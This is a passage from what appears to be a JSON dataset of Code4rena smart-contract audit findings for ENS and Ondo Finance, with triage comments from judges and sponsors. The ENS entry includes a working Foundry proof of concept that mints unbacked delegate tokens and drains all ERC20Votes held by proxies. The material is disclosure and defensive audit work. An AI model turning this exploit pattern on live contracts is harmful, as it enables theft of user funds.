tokens.\n2. Some tokens enable the direct draining of all approved `ERC20Votes` tokens.\n\nSome parts are similar between the two findings, but because they each deserved their own analysis and \"should fix\" - argumentation, they are submitted as separate findings.\n\n### Impact\n\nDraining all `ERC20Votes` tokens.\n\n### Proof of Concept\n\n**Starting assumptions:**\n\nThe `token` used as `ERC20Votes` returns the boolean `false` with `transferFrom` instead of reverting (not very likely implementation but still a possible and damaging edge case).\n\n**MockERC20Votes contract:**\n\nThe following `test/mocks/MockERC20Votes.sol` file is a simplified `ERC20Votes` token that wraps the original `transferFrom()` function to return a `bool` instead of reverting:\n\n```solidity\npragma solidity ^0.8.2;\n\nimport \"@openzeppelin/contracts/token/ERC20/ERC20.sol\";\nimport \"@openzeppelin/contracts/token/ERC20/extensions/ERC20Votes.sol\";\nimport \"forge-std/console.sol\";\n\ncontract MockERC20Votes is ERC20, ERC20Votes {\n    constructor()\n        ERC20(\"MockERC20Votes\", \"MOCK\")\n        ERC20Permit(\"MockERC20Votes\")\n    {\n        _mint(msg.sender, 1e30);\n    }\n\n    function superTransferFrom(\n        address sender,\n        address recipient,\n        uint256 amount\n    ) external returns (bool) {\n        return super.transferFrom(sender, recipient, amount);\n    }\n\n    function transferFrom(\n        address sender,\n        address recipient,\n        uint256 amount\n    ) public override returns (bool) {\n        (bool success, bytes memory data) = address(this).delegatecall(\n            abi.encodeCall(\n                MockERC20Votes.superTransferFrom,\n                (sender, recipient, amount)\n            )\n        );\n\n        console.log(\"success: \", success);\n\n        return success;\n    }\n\n    // The following functions are overrides required by Solidity.\n\n    function _afterTokenTransfer(\n        address from,\n        address to,\n        uint256 amount\n    ) internal override(ERC20, ERC20Votes) {\n        super._afterTokenTransfer(from, to, amount);\n    }\n\n    function _mint(\n        address to,\n        uint256 amount\n    ) internal override(ERC20, ERC20Votes) {\n        super._mint(to, amount);\n    }\n\n    function _burn(\n        address account,\n        uint256 amount\n    ) internal override(ERC20, ERC20Votes) {\n        super._burn(account, amount);\n    }\n}\n```\n\nThe tests `test_transferFromReturningTrue` and `test_transferFromReturningFalse` are provided to showcase an example implementation of an `ERC20Votes` token that, instead of reverting, would return a boolean `success == false`. The reason for such a token's existence won't be discussed, as the sheer possibility of its existence is the only argument that is of interest to us (and demands from customers are sometimes surprising). As yet again another reminder: the \"standard\" is still respected in this argumentation.\n\n**Foundry Setup:**\n\nAdd `require(\"@nomicfoundation/hardhat-foundry\")` in `hardhat.config.js` and run this to be able to run the POC:\n\n```\nnpm install --save-dev @nomicfoundation/hardhat-foundry\nnpx hardhat init-foundry\n```\n\n**Test contract:**\n\n1. Create a `test/delegatemulti.t.sol` file containing the code below and focus on `test_directDraining()`:\n\n<details>\n\n```solidity\n// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.2;\n\nimport \"forge-std/Test.sol\";\nimport \"forge-std/console.sol\";\nimport \"test/mocks/MockERC20Votes.sol\";\nimport \"contracts/ERC20MultiDelegate.sol\";\nimport \"@openzeppelin/contracts/token/ERC1155/IERC1155Receiver.sol\";\n\ncontract DelegateCallTest is IERC1155Receiver, Test {\n    address alice = makeAddr(\"Alice\");\n    address bob = makeAddr(\"Bob\");\n    MockERC20Votes votesToken;\n    ERC20MultiDelegate delegateToken;\n    address proxyAddress1;\n    address proxyAddress2;\n    address proxyAddress3;\n\n    function setUp() public {\n        // Deploying the tokens\n        votesToken = new MockERC20Votes();\n        delegateToken = new ERC20MultiDelegate(\n            votesToken,\n            \"https://code4rena.com/\"\n        );\n\n        // Giving some votesToken to Alice and Bob\n        votesToken.transfer(alice, 5);\n        votesToken.transfer(bob, 4);\n\n        // Initializing the ERC20MultiDelegate token with the first delegateMulti call\n        uint256[] memory initialSources; // No sources initially, just creating proxies and transferring votesToken\n        uint256[] memory initialTargets = new uint256[](3);\n        initialTargets[0] = 1;\n        initialTargets[1] = 2;\n        initialTargets[2] = 3;\n        uint256[] memory initialAmounts = new uint256[](3);\n        initialAmounts[0] = 0;\n        initialAmounts[1] = 10;\n        initialAmounts[2] = 20;\n        votesToken.approve(address(delegateToken), type(uint256).max);\n        delegateToken.delegateMulti(\n            initialSources,\n            initialTargets,\n            initialAmounts\n        );\n        proxyAddress1 = retrieveProxyContractAddress(address(uint160(1)));\n        proxyAddress2 = retrieveProxyContractAddress(address(uint160(2)));\n        proxyAddress3 = retrieveProxyContractAddress(address(uint160(3)));\n\n        // Making sure that the deployer's balance of ERC20MultiDelegate tokens matches the deployed proxies' balance.\n        assertEq(\n            votesToken.balanceOf(proxyAddress1),\n            delegateToken.balanceOf(address(this), 1)\n        );\n        assertEq(\n            votesToken.balanceOf(proxyAddress2),\n            delegateToken.balanceOf(address(this), 2)\n        );\n        assertEq(\n            votesToken.balanceOf(proxyAddress3),\n            delegateToken.balanceOf(address(this), 3)\n        );\n\n        // Alice approving ERC20MultiDelegate for her ERC20Votes tokens\n        vm.prank(alice);\n        votesToken.approve(address(delegateToken), type(uint256).max);\n    }\n\n    // Bug 1: Some tokens break accounting by enabling the free minting of `ERC20MultiDelegate` tokens\n    function test_freeMinting() public {\n        /* Showing the initial conditions through asserts */\n        // proxyAddress1 has 0 votesToken\n        assertEq(votesToken.balanceOf(proxyAddress1), 0);\n        // Alice has 5 voteTokens\n        assertEq(votesToken.balanceOf(alice), 5);\n        // Alice has 0 ERC20MultiDelegate tokens for ID(1)\n        assertEq(delegateToken.balanceOf(alice, 1), 0);\n\n        /* Begin minting for free */\n        vm.startPrank(alice);\n        uint256[] memory sources;\n        // Alice is targeting existing and non-existing proxies\n        uint256[] memory targets = new uint256[](7);\n        targets[0] = 1;\n        targets[1] = 2;\n        targets[2] = 3;\n        targets[3] = 4;\n        targets[4] = 5;\n        targets[5] = 6;\n        targets[6] = 7;\n        // Alice is using an arbitrary amount, exceeding the proxies' balances\n        uint256[] memory amounts = new uint256[](7);\n        amounts[0] = 100;\n        amounts[1] = 100;\n        amounts[2] = 100;\n        amounts[3] = 100;\n        amounts[4] = 100;\n        amounts[5] = 100;\n        amounts[6] = 100;\n        // Making the call, not reverting\n        delegateToken.delegateMulti(sources, targets, amounts);\n        vm.stopPrank();\n\n        /* Showing the final balances */\n        // There still aren't any ERC20Votes balance for proxyAddress1\n        assertEq(votesToken.balanceOf(proxyAddress1), 0);\n        // Alice's ERC20Votes balance stayed the same\n        assertEq(votesToken.balanceOf(alice), 5);\n        // However, ERC20MultiDelegate balances for IDs between 1 and 7 increased for Alice, effectively breaking accounting\n        assertEq(delegateToken.balanceOf(alice, 1), 100);\n        assertEq(delegateToken.balanceOf(alice, 2), 100);\n        assertEq(delegateToken.balanceOf(alice, 3), 100);\n        assertEq(delegateToken.balanceOf(alice, 4), 100);\n        assertEq(delegateToken.balanceOf(alice, 5), 100);\n        assertEq(delegateToken.balanceOf(alice, 6), 100);\n        assertEq(delegateToken.balanceOf(alice, 7), 100);\n    }\n\n    // Bug 2: Some tokens enable the direct draining of all approved `ERC20Votes` tokens\n    function test_directDraining() public {\n        /* Showing the initial conditions through asserts */\n        // Proxies' votesToken balance\n        assertEq(votesToken.balanceOf(proxyAddress1), 0);\n        assertEq(votesToken.balanceOf(proxyAddress2), 10);\n        assertEq(votesToken.balanceOf(proxyAddress3), 20);\n        // Alice's votesToken balance (from setUp())\n        assertEq(votesToken.balanceOf(alice), 5);\n        // Alice's delegateToken balance for each ID is initially 0\n        assertEq(delegateToken.balanceOf(alice, 1), 0);\n        assertEq(delegateToken.balanceOf(alice, 2), 0);\n        assertEq(delegateToken.balanceOf(alice, 3), 0);\n\n        /* Begin minting for free */\n        vm.startPrank(alice);\n        uint256[] memory sourcesStep1;\n        uint256[] memory targetsStep1 = new uint256[](3);\n        targetsStep1[0] = 1;\n        targetsStep1[1] = 2;\n        targetsStep1[2] = 3;\n        uint256[] memory amountsStep1 = new uint256[](3);\n        amountsStep1[0] = 100;\n        amountsStep1[1] = 100;\n        amountsStep1[2] = 100;\n        delegateToken.delegateMulti(sourcesStep1, targetsStep1, amountsStep1);\n        assertEq(delegateToken.balanceOf(alice, 1), 100);\n        assertEq(delegateToken.balanceOf(alice, 2), 100);\n        assertEq(delegateToken.balanceOf(alice, 3), 100);\n\n        /* Using newly-minted amounts to drain proxies */\n        uint256[] memory targetsStep2;\n        uint256[] memory sourcesStep2 = new uint256[](3);\n        sourcesStep2[0] = 1;\n        sourcesStep2[1] = 2;\n        sourcesStep2[2] = 3;\n        uint256[] memory amountsStep2 = new uint256[](3);\n        amountsStep2[0] = 0;\n        amountsStep2[1] = 10;\n        amountsStep2[2] = 20;\n        delegateToken.delegateMulti(sourcesStep2, targetsStep2, amountsStep2);\n\n        /* Showing the final balances */\n\n        // Proxies are drained\n        assertEq(votesToken.balanceOf(proxyAddress1), 0);\n        assertEq(votesToken.balanceOf(proxyAddress2), 0);\n        assertEq(votesToken.balanceOf(proxyAddress3), 0);\n\n        // Alice's votesToken balance is now \"InitialBalance + balances from proxies\"\n        assertEq(votesToken.balanceOf(alice), 5 + 10 + 20);\n\n        // Alice really did use her fake ERC20MultiDelegate balance\n        assertEq(delegateToken.balanceOf(alice, 1), 100);\n        assertEq(delegateToken.balanceOf(alice, 2), 90);\n        assertEq(delegateToken.balanceOf(alice, 3), 80);\n\n        vm.stopPrank();\n    }\n\n    /** BELOW ARE JUST UTILITIES */\n\n    // Making sure that the MockERC20Votes returns false instead of reverting on failure for transferFrom\n    function test_transferFromReturningFalse() public {\n        // If you don't approve yourself, transferFrom won't be directly callable\n        vm.prank(bob);\n        bool success = votesToken.transferFrom(alice, bob, 5);\n        assertEq(success, false);\n    }\n\n    // Making sure that the MockERC20Votes returns true on success for transferFrom\n    function test_transferFromReturningTrue() public {\n        // There's a need to approve yourself for a direct call to transferFrom(), surprisingly\n        vm.startPrank(alice);\n        votesToken.approve(alice, type(uint256).max);\n        bool success = votesToken.transferFrom(alice, bob, 5);\n        vm.stopPrank();\n        assertEq(success, true);\n    }\n\n    // copy-pasting and adapting ERC20MultiDelegate.retrieveProxyContractAddress\n    function retrieveProxyContractAddress(\n        address _delegate\n    ) private view returns (address) {\n        bytes memory bytecode = abi.encodePacked(\n            type(ERC20ProxyDelegator).creationCode,\n            abi.encode(votesToken, _delegate)\n        );\n        bytes32 hash = keccak256(\n            abi.encodePacked(\n                bytes1(0xff),\n                address(delegateToken),\n                uint256(0), // salt\n                keccak256(bytecode)\n            )\n        );\n        return address(uint160(uint256(hash)));\n    }\n\n    // No need to read below (IERC1155Receiver implementation)\n    function onERC1155Received(\n        address operator,\n        address from,\n        uint256 id,\n        uint256 value,\n        bytes calldata data\n    ) external returns (bytes4) {\n        return IERC1155Receiver.onERC1155Received.selector;\n    }\n\n    function onERC1155BatchReceived(\n        address operator,\n        address from,\n        uint256[] calldata ids,\n        uint256[] calldata values,\n        bytes calldata data\n    ) external returns (bytes4) {\n        return IERC1155Receiver.onERC1155BatchReceived.selector;\n    }\n\n    // ERC165 interface support\n    function supportsInterface(\n        bytes4 interfaceID\n    ) external view returns (bool) {\n        return\n            interfaceID == 0x01ffc9a7 || // ERC165\n            interfaceID == 0x4e2312e0; // ERC1155_ACCEPTED ^ ERC1155_BATCH_ACCEPTED;\n    }\n}\n```\n\n</details>\n\n\n2.  Run the test with `forge test --mt test_directDraining` and see this test passing.\n\n**Here's the layout of what's happening (the first 3 steps are like \"`Bug1: test_freeMinting`\"):**\n\n1. Initially, Alice owns some `ERC20Votes` tokens (`5`) but no `ERC20MultiDelegate` tokens.\n2. Alice calls `delegateMulti()` by targeting existing IDs on `ERC20MultiDelegate` and inputting `amount == 100` for each of them.\n3. The lack of revert (as a reminder, the `transferFrom()` function in this example returns a boolean) makes it that the silent failure enables Alice to mint any amount on any ID on `ERC20MultiDelegate`.\n4. Alice can now use their newly minted balance of `ERC20MultiDelegate` tokens by calling `delegateMulti()`, with this time the deployed proxy contracts as `source`s.\n5. All `ERC20Votes` tokens got drained from all deployed proxies and were transferred to Alice.\n\nHere, we're both breaking accounting (bug1) and taking advantage of approved funds to the main contract by the deployed proxies to drain all `ERC20Votes` tokens.\n\nAgain, this contract's security shouldn't depend on the behavior of an external `ERC20Votes` contract (it leaves vectors open). Hence, this is a \"should fix\" bug, meaning at least Medium severity. The token-draining part makes an argument for a higher severity.\n\n### Remediation\n\nWhile wrapping the `transferFrom()` statements in a `require` statement is a good idea that was suggested in the previous bug, it would also be advisable to try and enforce an invariant by checking for the `source`'s balance inside `_reimburse()`, just like it is done inside `_processDelegation()`. Albeit, it's for the `ERC20MultiDelegate`'s internal balance, and not `ERC20Votes`'s external balance check. The principle still holds and adding a check would increase security. Note that, while the existing `assert()` can be sidestepped, and this is detailed in another finding, it wouldn't be the case with `ERC20Votes`'s external balance due to the immediate transfer.\n\n### Assessed type\n\nToken-Transfer\n\n**[141345 (lookout) commented](https://github.com/code-423n4/2023-10-ens-findings/issues/91#issuecomment-1759034335):**\n > return false of `transferFrom()`.\n> \n> From [eip-20](https://eips.ethereum.org/EIPS/eip-20):\n> > Callers MUST handle false from returns (bool success). Callers MUST NOT assume that false is never returned!\n> \n> Tokens should comply with `ERC20votes` standard, but reverting on failure is not ERC20 standard.\n\n**[Arachnid (ENS) confirmed, but disagreed with severity and commented](https://github.com/code-423n4/2023-10-ens-findings/issues/91#issuecomment-1763944543):**\n > Agreed this is a valid issue - to be ERC20 compliant we must check the return value. Given the low likelihood, most token implementations and all known implementations of ERC20Votes revert - I would argue this should be rated as Medium.\n\n\n**[hansfriese (judge) decreased severity to Medium and commented](https://github.com/code-423n4/2023-10-ens-findings/issues/91#issuecomment-1775087374):**\n > Medium severity is appropriate with the low likelihood.\n\n*Note: for full discussion, see [here](https://github.com/code-423n4/2023-10-ens-findings/issues/91).*\n\n***\n\n",
      "summary": "\nA bug was found in the code of the ERC20MultiDelegate contract during a bot race. The bug is related to the unsafe use of the transferFrom function on non-standard ERC20 tokens. The transferFrom function in the ERC20Votes token could return a boolean instead of reverting, depending on the existence of the ERC20Votes token. This would mean that the tokens could be silently drained from the deployed proxies and transferred to Alice. This bug could break accounting and take advantage of the approved funds to the main contract, and is considered a \"should fix\" bug with a medium severity.\n\nThe recommended remediation is to wrap the transferFrom statements in a require statement and also to enforce an invariant by checking for the source's balance inside _reimburse(). This would increase security and prevent the existing assert() from being sidestepped.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "ENS",
      "source_link": "https://code4rena.com/reports/2023-10-ens",
      "github_link": "https://github.com/code-423n4/2023-10-ens-findings/issues/91",
      "tags": [],
      "finders": [
        "nirlin",
        "jnforja",
        "peakbolt",
        "Dravee",
        "thekmj",
        "J4X",
        "xAriextz",
        "squeaky\\_cactus",
        "Shogoki"
      ]
    },
    {
      "id": "27028",
      "title": "[N-02] Missing event to notify oracle has changed in `rUSDY`",
      "impact": "LOW",
      "content": "\nhttps://github.com/code-423n4/2023-09-ondo/blob/main/contracts/usdy/rUSDY.sol#L662\n\nThe `setOracle()` function should emit an event to signal off-chain actors that the oracle has been updated.\n\n**[kirk-baird (judge) commented](https://github.com/code-423n4/2023-09-ondo-findings/issues/502#issuecomment-1732511120):**\n > The issues raised in this report are all valid and contain quality analysis. They correctly determine the severity except L-01, which I would consider a non-critical severity, rather than low.\n\n**[ali2251 (Ondo) confirmed](https://github.com/code-423n4/2023-09-ondo-findings/issues/502#issuecomment-1733762354)**\n\n***\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Ondo Finance",
      "source_link": "https://code4rena.com/reports/2023-09-ondo",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "27027",
      "title": "[N-01] Missing calls to base initializers in `rUSDY`",
      "impact": "LOW",
      "content": "\nhttps://github.com/code-423n4/2023-09-ondo/blob/main/contracts/usdy/rUSDY.sol#L120\n\nThe `__rUSDY_init()` function doesn't call the initializers for some of the base contracts:\n\n- `Initializable`\n- `ContextUpgradeable`\n- `PausableUpgradeable`\n- `AccessControlEnumerableUpgradeable`\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Ondo Finance",
      "source_link": "https://code4rena.com/reports/2023-09-ondo",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "27026",
      "title": "[L-10] Contracts can be re-deployed in `rUSDY` factory",
      "impact": "LOW",
      "content": "\nhttps://github.com/code-423n4/2023-09-ondo/blob/main/contracts/usdy/rUSDYFactory.sol#L75\n\nThe `rUSDY` contract can be redeployed by the guardian by calling `deployrUSDY()` in the `rUSDYFactory` contract. This will deploy a new set of contracts and overwrite the storage variables that link to the contract.\n\nIt is recommended to add a check to avoid redeployment once contracts have been deployed.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Ondo Finance",
      "source_link": "https://code4rena.com/reports/2023-09-ondo",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "27025",
      "title": "[L-09] Wrong argument in `TransferShares` event of `wrap()` function",
      "impact": "LOW",
      "content": "\nhttps://github.com/code-423n4/2023-09-ondo/blob/main/contracts/usdy/rUSDY.sol#L439\n\nThe third argument to the `TransferShares` event is expecting the amount of shares but it is wrongly called with `_USDYAmount`, which is the amount of `USDY` tokens, not the shares.\n\nThe correct version should be:\n\n```solidity\nemit TransferShares(address(0), msg.sender, _USDYAmount * BPS_DENOMINATOR);\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Ondo Finance",
      "source_link": "https://code4rena.com/reports/2023-09-ondo",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "27024",
      "title": "[L-08] Wrong argument in `Transfer` event of `wrap()` function",
      "impact": "LOW",
      "content": "\nhttps://github.com/code-423n4/2023-09-ondo/blob/main/contracts/usdy/rUSDY.sol#L438\n\nThe third argument to the `Transfer` event is expecting the amount of `rUSDY` tokens but it is wrongly called with `getRUSDYByShares(_USDYAmount)`, which lacks the proper scaling to convert the `USDY` amount to shares.\n\nThe correct version should be:\n\n```solidity\nemit Transfer(address(0), msg.sender, getRUSDYByShares(_USDYAmount * BPS_DENOMINATOR));\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Ondo Finance",
      "source_link": "https://code4rena.com/reports/2023-09-ondo",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "27023",
      "title": "[L-07] Oracle assumes asset has 18 decimals",
      "impact": "LOW",
      "content": "\nhttps://github.com/code-423n4/2023-09-ondo/blob/main/contracts/rwaOracles/RWADynamicOracle.sol#L282\n\nThe `roundUpTo8()` implementation assumes the asset has 18 decimals, as the rounding is done using `1e10` (since `18 - 8 = 10`). It is recommended to use a constant to properly state this dependency and for a better understanding. \n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Ondo Finance",
      "source_link": "https://code4rena.com/reports/2023-09-ondo",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "27022",
      "title": "[L-06] Missing validation for index parameter in `overrideRange()`",
      "impact": "LOW",
      "content": "\nhttps://github.com/code-423n4/2023-09-ondo/blob/main/contracts/rwaOracles/RWADynamicOracle.sol#L186\n\nThe `overrideRange()` function should validate that `indexToModify` is within bounds, i.e. `require(indexToModify < rangeLength)`.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Ondo Finance",
      "source_link": "https://code4rena.com/reports/2023-09-ondo",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "27021",
      "title": "[L-05] Account may get blacklisted during the bridge process",
      "impact": "LOW",
      "content": "\nhttps://github.com/code-423n4/2023-09-ondo/blob/main/contracts/bridge/DestinationBridge.sol#L349\n\nAccounts that bridge tokens may get blacklisted in the source chain after the bridging process had been initiated. This could lead to different issues:\n\n- If the account is not blacklisted in the destination chain, the user may still operate their funds.\n- If the account is blacklisted, then the function will revert and could be treated as a failure that would require manual intervention.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Ondo Finance",
      "source_link": "https://code4rena.com/reports/2023-09-ondo",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "27020",
      "title": "[L-04] Missing safe wrapper for ERC20 transfer in `rescueTokens()`",
      "impact": "LOW",
      "content": "\nhttps://github.com/code-423n4/2023-09-ondo/blob/main/contracts/bridge/DestinationBridge.sol#L322\n\nUse a \"safe\" wrapper to execute ERC20 transfer for better compatibility.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Ondo Finance",
      "source_link": "https://code4rena.com/reports/2023-09-ondo",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "27019",
      "title": "[L-03] Validate number of approvers in `setThresholds()`",
      "impact": "LOW",
      "content": "\nhttps://github.com/code-423n4/2023-09-ondo/blob/main/contracts/bridge/DestinationBridge.sol#L255\n\nThe `setThresholds()` function should validate that elements in the `numOfApprovers` array are greater than zero.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Ondo Finance",
      "source_link": "https://code4rena.com/reports/2023-09-ondo",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "27018",
      "title": "[L-02] No default threshold configuration",
      "impact": "LOW",
      "content": "\nhttps://github.com/code-423n4/2023-09-ondo/blob/main/contracts/bridge/DestinationBridge.sol#L128\n\nThe implementation of `_attachThreshold()` loops through each of the configured set of thresholds searching for the element that adjusts to the bridged amount. \n\nIf no configuration is found the function will revert, the message will be lost and it will require manual handling. \n\nIt is recommended setting a default value (a high value number of approvals) to be used when no threshold configuration matches.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Ondo Finance",
      "source_link": "https://code4rena.com/reports/2023-09-ondo",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "27017",
      "title": "[L-01] Confusing semantics for bridged messages approvals",
      "impact": "LOW",
      "content": "\nhttps://github.com/code-423n4/2023-09-ondo/blob/main/contracts/bridge/DestinationBridge.sol#L111\n\nBridged messages get an \"automatic\" approval while the message is being executed in the destination bridge contract, which means that all messages effectively get one approval as soon as they are bridged.\n\nThis implies that \"real\" approvals would require setting a threshold with a `numberOfApprovalsNeeded` of at least two. \n\nThis brings a lot of unnecessary confusing semantics to the approvals scheme and could potentially lead to errors in configuration settings that would allow messages to go through automatically when actually they are expected to be approved. \n\nIt is recommended to remove this automatic approval and treat each approval as an explicit approval action of the set of enabled approvers.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Ondo Finance",
      "source_link": "https://code4rena.com/reports/2023-09-ondo",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "27016",
      "title": "[M-04] Admin can't burn tokens from blocklisted addresses because of a check in `_beforeTokenTransfer`",
      "impact": "MEDIUM",
      "content": "\nThe function `burn` is made so the admin can burn rUSDY tokens from **any account** (this is stated in the comments). However, the admin can't burn tokens if the account from which they're trying to burn tokens is blocklisted/sanctioned/not on the allow-list.\n\n### Proof of Concept\n\nLet's check the `burn` function which calls the internal `_burnShares` function:\n\n```javascript\nfunction burn(\n    address _account,\n    uint256 _amount\n  ) external onlyRole(BURNER_ROLE) {\n    uint256 sharesAmount = getSharesByRUSDY(_amount);\n\n    _burnShares(_account, sharesAmount);\n\n    usdy.transfer(msg.sender, sharesAmount / BPS_DENOMINATOR);\n\n    emit TokensBurnt(_account, _amount);\n  }\n\n  function _burnShares(\n    address _account,\n    uint256 _sharesAmount\n  ) internal whenNotPaused returns (uint256) {\n    require(_account != address(0), \"BURN_FROM_THE_ZERO_ADDRESS\");\n\n    _beforeTokenTransfer(_account, address(0), _sharesAmount); <--\n\n    uint256 accountShares = shares[_account];\n    require(_sharesAmount <= accountShares, \"BURN_AMOUNT_EXCEEDS_BALANCE\");\n\n    uint256 preRebaseTokenAmount = getRUSDYByShares(_sharesAmount);\n\n    totalShares -= _sharesAmount;\n\n    shares[_account] = accountShares - _sharesAmount;\n\n    uint256 postRebaseTokenAmount = getRUSDYByShares(_sharesAmount);\n\n    return totalShares;\n```\n\nWe can see that it calls `_beforeTokenTransfer(_account, address(0), _sharesAmount)`.\n\nHere is the code of `_beforeTokenTransfer`:\n\n```javascript\nfunction _beforeTokenTransfer(\n    address from,\n    address to,\n    uint256\n  ) internal view {\n    // Check constraints when `transferFrom` is called to facilitate\n    // a transfer between two parties that are not `from` or `to`.\n    if (from != msg.sender && to != msg.sender) {\n      require(!_isBlocked(msg.sender), \"rUSDY: 'sender' address blocked\");\n      require(!_isSanctioned(msg.sender), \"rUSDY: 'sender' address sanctioned\");\n      require(\n        _isAllowed(msg.sender),\n        \"rUSDY: 'sender' address not on allowlist\"\n      );\n    }\n\n    if (from != address(0)) { <--\n      // If not minting\n      require(!_isBlocked(from), \"rUSDY: 'from' address blocked\");\n      require(!_isSanctioned(from), \"rUSDY: 'from' address sanctioned\");\n      require(_isAllowed(from), \"rUSDY: 'from' address not on allowlist\");\n    }\n\n    if (to != address(0)) {\n      // If not burning\n      require(!_isBlocked(to), \"rUSDY: 'to' address blocked\");\n      require(!_isSanctioned(to), \"rUSDY: 'to' address sanctioned\");\n      require(_isAllowed(to), \"rUSDY: 'to' address not on allowlist\");\n    }\n  }\n```\n\nIn our case, the `form` would be the account from which we're burning tokens, so it'll enter in the 2nd if: `if (from != address(0))`. But given that the account is blocked/sanctioned/not on the allow-list, the transaction will revert and the tokens won't be burned.\n\nGiven that there are separate roles for burning and managing the block/sanctions/allowed lists (`BURNER_ROLE` and `LIST_CONFIGURER_ROLE`), it is very possible that such a scenario would occur.\n\nIn that case, the Burner would have to ask the List Configurer to update the lists, so the Burner can burn the tokens, and then the List Configurer should update the lists again. However, in that case, you're risking that the blocked user manages to transfer their funds while performing these operations.\n\n### Recommended Mitigation Steps\n\nOrganize the logic of the function better. For example, you can make the 2nd if to be:\n`if (from != address(0) && to != address(0))`. That way, we'll not enter the `if` when burning tokens, and we'll be able to burn tokens from blocked accounts.\n\n### Assessed type\n\nInvalid Validation\n\n**[tom2o17 (Ondo) disputed and commented via duplicate issue #120](https://github.com/code-423n4/2023-09-ondo-findings/issues/120#issuecomment-1714220911):**\n> Can I not assume that the guardian can batch execute transactions?\nGiven that the guardian will also have the ability to add/remove from blocklist, can I not assume that the guardian can batch:\n>\n> ```\n> blocklist.removeFromBlocklist()\n> rUSDY.burn()\n> blocklist.addToBlocklist()\n> ```\n>\n> IFL this is not an issue considering the guardian address can execute any peripheral txns in an atomic fashion. \n\n**[kirk-baird (judge) commented via duplicate issue #120](https://github.com/code-423n4/2023-09-ondo-findings/issues/120#issuecomment-1725127719):**\n> This is an interesting edge case. While it may be possible for guardian to bypass this issue, if it is a smart contract that can batch transactions, I see this as a potential issue.\n> \n> Going to downgrade [issue #120](https://github.com/code-423n4/2023-09-ondo-findings/issues/120) to medium severity, as there are some theoretical workarounds to this problem.\n\n**[tom2o17 (Ondo) commented via duplicate issue #120](https://github.com/code-423n4/2023-09-ondo-findings/issues/120#issuecomment-1736164013):**\n> Not to impact judging,\n>\n> But to your point @kirk-baird, we are using a gnosis safe contract as the guardian, and plan to do a similar setup for the majority of tokens going forward. Perhaps we should have made note of that in the `ReadME.md`.\n\n**[kirk-baird (judge) commented via duplicate issue #120](https://github.com/code-423n4/2023-09-ondo-findings/issues/120#issuecomment-1736530397):**\n> @tom2o17 - Okay thanks for clarifying - that does resolve the issue. Though, for the judging the wardens weren't aware of this so I'll consider it a valid issue.\n\n**[ali2251 (Ondo) acknowledged](https://github.com/code-423n4/2023-09-ondo-findings/issues/136#issuecomment-1738095660)**\n\n***\n\n",
      "summary": "\nThe bug report is about a function called `burn` which is made so the admin can burn rUSDY tokens from any account. However, the admin can't burn tokens if the account from which they're trying to burn tokens is blocklisted/sanctioned/not on the allow-list. The bug is caused by the code of `_beforeTokenTransfer` function, which checks constraints when `transferFrom` is called to facilitate a transfer between two parties that are not `from` or `to`. This means that if the `from` address is not `address(0)`, it will check if it is blocked, sanctioned, or not on the allow-list. If it is, the transaction will revert and the tokens won't be burned.\n\nThe recommended mitigation steps are to organize the logic of the function better. For example, the 2nd `if` statement can be changed to `if (from != address(0) && to != address(0))`. This way, it will not enter the `if` statement when burning tokens, and the tokens can be burned from blocked accounts.\n\nThe assessed type of the bug is Invalid Validation. It was initially disputed by tom2o17, who suggested that the guardian can batch execute transactions to bypass the issue. However, kirk-baird, the judge, downgraded the issue to medium severity as there are some theoretical workarounds to this problem. tom2o17 then clarified that they are using a gnosis safe contract as the guardian, which resolves the issue. The issue was then acknowledged by ali2251.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Ondo Finance",
      "source_link": "https://code4rena.com/reports/2023-09-ondo",
      "github_link": "https://github.com/code-423n4/2023-09-ondo-findings/issues/136",
      "tags": [],
      "finders": [
        "0xStalin",
        "Arz",
        "Inspecktor",
        "0xAsen",
        "merlin",
        "Delvir0",
        "BenRai"
      ]
    },
    {
      "id": "27015",
